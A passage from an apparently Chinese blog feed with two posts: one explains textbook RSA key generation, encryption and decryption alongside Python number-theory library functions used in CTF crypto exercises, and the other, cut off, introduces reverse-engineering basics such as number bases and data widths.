都是a的模反元素。</p><p>欧拉定理可以用来证明模反元素必然存在。</p><p>可以看到，a的 φ(n)-1 次方，就是a的模反元素。</p>        <h2 id="2-RSA加密">          <a href="#2-RSA加密" class="heading-link"><i class="fas fa-link"></i></a>2. RSA加密</h2>      <p>RSA的加密过程可以使用一个通式来表达</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-1a2f6947c2fc8f9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/352/format/webp" style alt="img"></p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。就这么简单？对，就是这么简单。<br> 从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说<strong>E和N的组合就是公钥</strong>，我们用(E,N)来表示公钥</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-7017df85daaa0d5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/327/format/webp" style alt="img"></p><p>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母</p>        <h2 id="3-RSA解密">          <a href="#3-RSA解密" class="heading-link"><i class="fas fa-link"></i></a>3. RSA解密</h2>      <p>RSA的解密同样可以使用一个通式来表达</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-e2b53cccd699aff1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/318/format/webp" style alt="img"></p><p>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-3e379a1e8ed76d9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/282/format/webp" style alt="img"></p><p>从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”<br> 此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p><p>小结下</p><div class="table-container"><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">公钥</td><td align="center">（E，N）</td></tr><tr><td align="center">私钥</td><td align="center">（D，N）</td></tr><tr><td align="center">密钥对</td><td align="center">（E，D，N）</td></tr></tbody></table></div><p>此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p>        <h2 id="4-生成密钥对">          <a href="#4-生成密钥对" class="heading-link"><i class="fas fa-link"></i></a>4. 生成密钥对</h2>      <p>既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？步骤如下：</p><ol><li>求N</li><li>求L（L为中间过程的中间数）</li><li>求E</li><li>求D</li></ol>        <h3 id="4-1-求N">          <a href="#4-1-求N" class="heading-link"><i class="fas fa-link"></i></a>4.1 求N</h3>      <p>准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N</p><blockquote>        <h4 id="N-p-q">          <a href="#N-p-q" class="heading-link"><i class="fas fa-link"></i></a>N = p * q</h4>      </blockquote>        <h3 id="4-2-求L">          <a href="#4-2-求L" class="heading-link"><i class="fas fa-link"></i></a>4.2 求L</h3>      <p>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示</p><blockquote>        <h4 id="L-lcm（p－1，q－1）">          <a href="#L-lcm（p－1，q－1）" class="heading-link"><i class="fas fa-link"></i></a>L=lcm（p－1，q－1）</h4>      </blockquote>        <h3 id="4-3-求E">          <a href="#4-3-求E" class="heading-link"><i class="fas fa-link"></i></a>4.3 求E</h3>      <p>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1<br> 用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p><blockquote>        <h4 id="1-lt-E-lt-L">          <a href="#1-lt-E-lt-L" class="heading-link"><i class="fas fa-link"></i></a>1 &lt; E &lt; L</h4>              <h4 id="gcd（E，L）-1">          <a href="#gcd（E，L）-1" class="heading-link"><i class="fas fa-link"></i></a>gcd（E，L）=1</h4>      </blockquote><p>之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。</p>        <h3 id="4-4-求D">          <a href="#4-4-求D" class="heading-link"><i class="fas fa-link"></i></a>4.4 求D</h3>      <p>数D是由数E计算出来的，D与L互质。D、E和L之间必须满足以下关系：</p><blockquote>        <h4 id="1-lt-D-lt-L">          <a href="#1-lt-D-lt-L" class="heading-link"><i class="fas fa-link"></i></a>1 &lt; D &lt; L</h4>              <h4 id="E＊D-mod-L-＝-1">          <a href="#E＊D-mod-L-＝-1" class="heading-link"><i class="fas fa-link"></i></a>E＊D mod L ＝ 1</h4>              <h3 id="D-gmpy2-invert-E-L">          <a href="#D-gmpy2-invert-E-L" class="heading-link"><i class="fas fa-link"></i></a>D=gmpy2.invert(E,L)</h3>      </blockquote><p>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。<br> 简单地说条件2是为了保证密文解密后的数据就是明文。<br> 现在私钥自然也已经生成了，密钥对也就自然生成了。<br> 小结下：</p><div class="table-container"><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">求N</td><td align="center">N＝ p ＊ q ；p，q为质数</td></tr><tr><td align="center">求L</td><td align="center">L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数</td></tr><tr><td align="center">求E</td><td align="center">1 &lt; E &lt; L，gcd（E，L）=1；E，L最大公约数为1（E和L互质）</td></tr><tr><td align="center">求D</td><td align="center">1 &lt; D &lt; L，E＊D mod L ＝ 1</td></tr></tbody></table></div>        <h3 id="4-5-加密">          <a href="#4-5-加密" class="heading-link"><i class="fas fa-link"></i></a>4.5 加密</h3>      <p><strong>密文＝明文^E mod N</strong></p><p><strong>C=M^E mod N</strong></p><p><strong>C=pow(M,E,N)</strong></p>        <h3 id="4-6-解密">          <a href="#4-6-解密" class="heading-link"><i class="fas fa-link"></i></a>4.6 解密</h3>      <p><strong>明文＝密文^D mod N</strong></p><p><strong>M=C^D mod N</strong></p><p><strong>M=pow(C,D,N)</strong></p>        <h1 id="二，RSA-解密常用库和函数">          <a href="#二，RSA-解密常用库和函数" class="heading-link"><i class="fas fa-link"></i></a>二，RSA 解密常用库和函数</h1>              <h2 id="1-gmpy2-库">          <a href="#1-gmpy2-库" class="heading-link"><i class="fas fa-link"></i></a>1. gmpy2 库</h2>              <h3 id="1-1-gmpy2-mpz-x">          <a href="#1-1-gmpy2-mpz-x" class="heading-link"><i class="fas fa-link"></i></a>1.1  gmpy2.mpz(x)</h3>      <p>初始化一个大整数x</p>        <h3 id="1-2-gmpy2-mpfr-x">          <a href="#1-2-gmpy2-mpfr-x" class="heading-link"><i class="fas fa-link"></i></a>1.2 gmpy2.mpfr(x)</h3>      <p>初始化一个高精度浮点数x</p>        <h3 id="1-3-C-gmpy2-powmod-M-e-n">          <a href="#1-3-C-gmpy2-powmod-M-e-n" class="heading-link"><i class="fas fa-link"></i></a>1.3 C = gmpy2.powmod(M,e,n)</h3>      <p>幂取模，结果是 C = (M^e) mod n</p>        <h3 id="1-4-d-gmpy2-invert-e-L">          <a href="#1-4-d-gmpy2-invert-e-L" class="heading-link"><i class="fas fa-link"></i></a>1.4 d = gmpy2.invert(e,L)</h3>      <p>求逆元，de = 1 mod L（D和L互质，D和E互为逆元）</p>        <h3 id="1-5-gmpy2-is-prime-n">          <a href="#1-5-gmpy2-is-prime-n" class="heading-link"><i class="fas fa-link"></i></a>1.5 gmpy2.is_prime(n)</h3>      <p>判断n是不是素数</p>        <h3 id="1-6-gmpy2-gcd-a-b">          <a href="#1-6-gmpy2-gcd-a-b" class="heading-link"><i class="fas fa-link"></i></a>1.6 gmpy2.gcd(a,b)</h3>      <p>欧几里得算法，最大公约数</p>        <h3 id="1-7-gmpy2-gcdext-a-b">          <a href="#1-7-gmpy2-gcdext-a-b" class="heading-link"><i class="fas fa-link"></i></a>1.7 gmpy2.gcdext(a,b)</h3>      <p>扩展欧几里得算法</p>        <h3 id="1-8-gmpy2-iroot-x-n">          <a href="#1-8-gmpy2-iroot-x-n" class="heading-link"><i class="fas fa-link"></i></a>1.8 gmpy2.iroot(x,n)</h3>      <p>x开n次根</p>        <h2 id="2-libnum-库">          <a href="#2-libnum-库" class="heading-link"><i class="fas fa-link"></i></a>2. libnum 库</h2>              <h3 id="2-1-libnum-s2n-s">          <a href="#2-1-libnum-s2n-s" class="heading-link"><i class="fas fa-link"></i></a>2.1 libnum.s2n(s)</h3>      <p>字符串转换为数字。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">&quot;ab12&quot;</span></span><br><span class="line">print(libnum.s2n(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1633825074</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-2-libnum-s2n-n">          <a href="#2-2-libnum-s2n-n" class="heading-link"><i class="fas fa-link"></i></a>2.2 libnum.s2n(n)</h3>      <p>数字转换为字符串。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">1633825074</span></span><br><span class="line">print(libnum.n2s(n))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-3-libnum-s2b-s">          <a href="#2-3-libnum-s2b-s" class="heading-link"><i class="fas fa-link"></i></a>2.3 libnum.s2b(s)</h3>      <p>字符串转换为二进制字符串。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">&quot;ab12&quot;</span></span><br><span class="line">print(libnum.s2b(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">01100001011000100011000100110010</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-4-libnum-b2s-b">          <a href="#2-4-libnum-b2s-b" class="heading-link"><i class="fas fa-link"></i></a>2.4 libnum.b2s(b)</h3>      <p>二进制字符串转换为字符串。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">b = <span class="string">&quot;01100001011000100011000100110010&quot;</span></span><br><span class="line">print(libnum.b2s(b))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-5-Primes">          <a href="#2-5-Primes" class="heading-link"><i class="fas fa-link"></i></a>2.5 Primes</h3>              <h4 id="2-5-1-libnum-primes-n">          <a href="#2-5-1-libnum-primes-n" class="heading-link"><i class="fas fa-link"></i></a>2.5.1 libnum.primes(n)</h4>      <p>返回不大于n的素数列表。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.primes(<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">result: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></div></figure>        <h4 id="2-5-2-libnum-generate-prime-n">          <a href="#2-5-2-libnum-generate-prime-n" class="heading-link"><i class="fas fa-link"></i></a>2.5.2 libnum.generate_prime(n)</h4>      <p>产生长度为n位的伪素数。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.generate_prime(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1021</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-6-其它">          <a href="#2-6-其它" class="heading-link"><i class="fas fa-link"></i></a>2.6 其它</h3>              <h4 id="2-6-1-libnum-factorize-n">          <a href="#2-6-1-libnum-factorize-n" class="heading-link"><i class="fas fa-link"></i></a>2.6.1 libnum.factorize(n)</h4>      <p>返回n的所有素因子及每个素因子的个数。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.factorize(<span class="number">60</span>))</span><br><span class="line"></span><br><span class="line">result: &#123;<span class="number">2</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">1</span>, <span class="number">5</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></div></figure>        <h4 id="2-6-2-libnum-modular-invmod-e-m">          <a href="#2-6-2-libnum-modular-invmod-e-m" class="heading-link"><i class="fas fa-link"></i></a>2.6.2 libnum.modular.invmod(e,m)</h4>      <p>返回e模m的逆元。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.modular.invmod(<span class="number">5</span>,<span class="number">24</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">5</span></span><br></pre></td></tr></table></div></figure><p><strong>其他查看：</strong><span class="exturl"><a class="exturl__link" href="https://github.com/hellman/libnum">https://github.com/hellman/libnum</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="3-Crypto-Util-number-库">          <a href="#3-Crypto-Util-number-库" class="heading-link"><i class="fas fa-link"></i></a>3. Crypto.Util.number 库</h2>              <h3 id="3-1-long-to-bytes">          <a href="#3-1-long-to-bytes" class="heading-link"><i class="fas fa-link"></i></a>3.1 long_to_bytes()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">long_to_bytes(0x41424344)</span><br><span class="line"></span><br><span class="line"># 整数转字节</span><br></pre></td></tr></table></div></figure>        <h3 id="3-2-bytes-to-long">          <a href="#3-2-bytes-to-long" class="heading-link"><i class="fas fa-link"></i></a>3.2 bytes_to_long()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes_to_long(b&#39;hello&#39;)</span><br><span class="line"></span><br><span class="line"># 字节转整数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-3-GCD">          <a href="#3-3-GCD" class="heading-link"><i class="fas fa-link"></i></a>3.3 GCD</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GCD(a,b)</span><br><span class="line"></span><br><span class="line"># a和b最大公约数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-4-inverse">          <a href="#3-4-inverse" class="heading-link"><i class="fas fa-link"></i></a>3.4 inverse()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inverse(10,5)</span><br><span class="line"></span><br><span class="line"># 求逆元</span><br></pre></td></tr></table></div></figure>        <h3 id="3-5-getRandomRange">          <a href="#3-5-getRandomRange" class="heading-link"><i class="fas fa-link"></i></a>3.5 getRandomRange()</h3>              <h3 id="3-6-isPrime">          <a href="#3-6-isPrime" class="heading-link"><i class="fas fa-link"></i></a>3.6 isPrime()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isPrime(1227)</span><br><span class="line"></span><br><span class="line"># 判断是不是素数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-7-size">          <a href="#3-7-size" class="heading-link"><i class="fas fa-link"></i></a>3.7 size()</h3>              <h3 id="3-8-getStrongPrime">          <a href="#3-8-getStrongPrime" class="heading-link"><i class="fas fa-link"></i></a>3.8 getStrongPrime()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getStrongPrime(512)</span><br><span class="line"></span><br><span class="line"># 返回强素数</span><br></pre></td></tr></table></div></figure>        <h3 id="3-9-ceil-div">          <a href="#3-9-ceil-div" class="heading-link"><i class="fas fa-link"></i></a>3.9 ceil_div()</h3>              <h3 id="3-10-ceil-shift">          <a href="#3-10-ceil-shift" class="heading-link"><i class="fas fa-link"></i></a>3.10 ceil_shift()</h3>              <h3 id="3-11-floor-div">          <a href="#3-11-floor-div" class="heading-link"><i class="fas fa-link"></i></a>3.11 floor_div()</h3>              <h3 id="3-12-exact-div">          <a href="#3-12-exact-div" class="heading-link"><i class="fas fa-link"></i></a>3.12 exact_div()</h3>              <h3 id="3-13-exact-log2">          <a href="#3-13-exact-log2" class="heading-link"><i class="fas fa-link"></i></a>3.13 exact_log2()</h3>              <h3 id="3-14-getPrime">          <a href="#3-14-getPrime" class="heading-link"><i class="fas fa-link"></i></a>3.14 getPrime()</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getPrime(16)</span><br><span class="line"></span><br><span class="line"># 返回一个最大为 N bit 的随机素数</span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/pcheng/p/9629621.html">https://www.cnblogs.com/pcheng/p/9629621.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/qq_42876636/article/details/87559366">https://blog.csdn.net/qq_42876636/article/details/87559366</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.jianshu.com/p/685cfeffe703">https://www.jianshu.com/p/685cfeffe703</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/a745233700/article/details/102341542?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">https://blog.csdn.net/a745233700/article/details/102341542?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>套路：<span class="exturl"><a class="exturl__link" href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/index.html">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/index.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.anquanke.com/post/id/84632">https://www.anquanke.com/post/id/84632</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>题型总结：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/vhkjhwbs/article/details/101160822">https://blog.csdn.net/vhkjhwbs/article/details/101160822</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>欧几里得：<span class="exturl"><a class="exturl__link" href="https://www.sohu.com/a/243246344_472906">https://www.sohu.com/a/243246344_472906</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>典型RSA题解：<span class="exturl"><a class="exturl__link" href="https://beiyuouo.github.io/blog/ctf-buuctf/">https://beiyuouo.github.io/blog/ctf-buuctf/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Misc密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向基础概要</title>
      <link href="2020/07/31/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A6%81/"/>
      <url>2020/07/31/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="逆向基础概要">          <a href="#逆向基础概要" class="heading-link"><i class="fas fa-link"></i></a>逆向基础概要</h1>              <h2 id="一，机器语言">          <a href="#一，机器语言" class="heading-link"><i class="fas fa-link"></i></a>一，机器语言</h2>      <p>加：0100 0000<br>减：0100 1000<br>乘：1111 0111 1110 0000<br>除：1111 0111 1111 0000</p>        <h2 id="二，汇编语言">          <a href="#二，汇编语言" class="heading-link"><i class="fas fa-link"></i></a>二，汇编语言</h2>      <a id="more"></a><p>编译器作用：把汇编语言转为机器语言</p><p><img src="https://img-blog.csdnimg.cn/20200503222526576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="三，C语言">          <a href="#三，C语言" class="heading-link"><i class="fas fa-link"></i></a>三，C语言</h2>      <p><img src="https://img-blog.csdnimg.cn/20200503222601780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="四，C语言和C-的关系">          <a href="#四，C语言和C-的关系" class="heading-link"><i class="fas fa-link"></i></a>四，C语言和C++的关系</h2>      <ol><li>C与C++没有本质区别，只是编译器能做的事情越来越多，功能越来越强大了。</li><li>C是学好C++的基础</li></ol>        <h2 id="五，为什么要学会汇编">          <a href="#五，为什么要学会汇编" class="heading-link"><i class="fas fa-link"></i></a>五，为什么要学会汇编</h2>      <p><img src="https://img-blog.csdnimg.cn/20200503223357845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="六，学习环境">          <a href="#六，学习环境" class="heading-link"><i class="fas fa-link"></i></a>六，学习环境</h2>      <ol><li>VC6</li><li>VS2010 VS2013 VS2016</li></ol><p>选VC6的原因<br>越是新版的添加的代码越多，不利于学习</p>        <h1 id="进制">          <a href="#进制" class="heading-link"><i class="fas fa-link"></i></a>进制</h1>              <h2 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>      <p>要想学好进制，首先忘记熟悉的十进制，和进制间的转换</p>        <h2 id="进制的定义">          <a href="#进制的定义" class="heading-link"><i class="fas fa-link"></i></a>进制的定义</h2>      <ol><li>八进制的定义：八个符号组成，0，1，2，3，4，5，6，7，逢八进一</li><li>十进制的定义：十个符号组成，0，1，2，3，4，5，6，7，8，9，逢十进一</li><li>N进制的定义：N个符号组成，逢N进一</li></ol><p>个人进制定义：关键是在逢N进一，符号是自己定义的</p><p>注意：进位是向左边进一位，左面是高位</p>        <h2 id="进制的书写">          <a href="#进制的书写" class="heading-link"><i class="fas fa-link"></i></a>进制的书写</h2>      <p>比如说：七进制</p><p><img src="https://img-blog.csdnimg.cn/20200503225425814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>注意</strong></p><p><strong>个人进制定义：关键是在逢N进一，符号是自己定义的</strong></p><p>例如：1+1=3是否正确<br>答案可以是正确的，如果对于自定义进制的话</p><p><strong>意义：</strong><br>将这种进制方式用于进制加密，可以给解密者很大的困扰</p>        <h2 id="进制运算">          <a href="#进制运算" class="heading-link"><i class="fas fa-link"></i></a>进制运算</h2>      <p>例如：八进制的运算</p><p><img src="https://img-blog.csdnimg.cn/20200503230309345.png" alt="img"></p><p>可以先把加法表和乘法表画出来</p><p><img src="https://img-blog.csdnimg.cn/2020050323171883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200503231749187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200503231920436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="计算机为什么用二进制">          <a href="#计算机为什么用二进制" class="heading-link"><i class="fas fa-link"></i></a>计算机为什么用二进制</h2>      <p>计算机时用电的，电路只有两种状态：1 真（通电）0假（断电）<br>计算机中 存储的任何文件，接受的任何指令都是0和1组成的</p><p>题外：量子计算机：量子还有非真非假的状态，计算量大大提升</p>        <h2 id="二进制的简写形式">          <a href="#二进制的简写形式" class="heading-link"><i class="fas fa-link"></i></a>二进制的简写形式</h2>      <p>十六进制在计算机中可以看作二进制的简写形式</p><p><img src="https://img-blog.csdnimg.cn/2020050323331535.png" alt="img"></p>        <h2 id="数据宽度">          <a href="#数据宽度" class="heading-link"><i class="fas fa-link"></i></a>数据宽度</h2>      <p>在计算机中由于受硬件的限制，数据是有一定长度限制的（称为数据宽度），超过最多宽度的数据会被丢弃。<br><strong>1. 常见的数据宽度</strong></p><p><img src="https://img-blog.csdnimg.cn/2020050323494873.png" alt="img"></p><p>位：里面只能存放一个值（0或1），计算机中最小存储单位<br>字节：一个字节有8个位<br>字：有16位<br>双子：可以存储32位<br><strong>2. 存储范围</strong></p><p><img src="https://img-blog.csdnimg.cn/20200503235434433.png" alt="img"></p><p><strong>例如：</strong><br>char ：计算机就知道要用容器是8位（1个字节）<br>int：计算机就知道你要用的容器是32位的（双字）</p>        <h2 id="有无符号数">          <a href="#有无符号数" class="heading-link"><i class="fas fa-link"></i></a>有无符号数</h2>      <p>不同的编码不同的规则</p><p><strong>1. 无符号数的编码规则</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504000821314.png" alt="img"></p><p>无符号数：这个数是多少就存多少<br>文件不同，解析方式也不同</p><p><strong>2. 有符号数 正数编码规则</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504221043966.png" 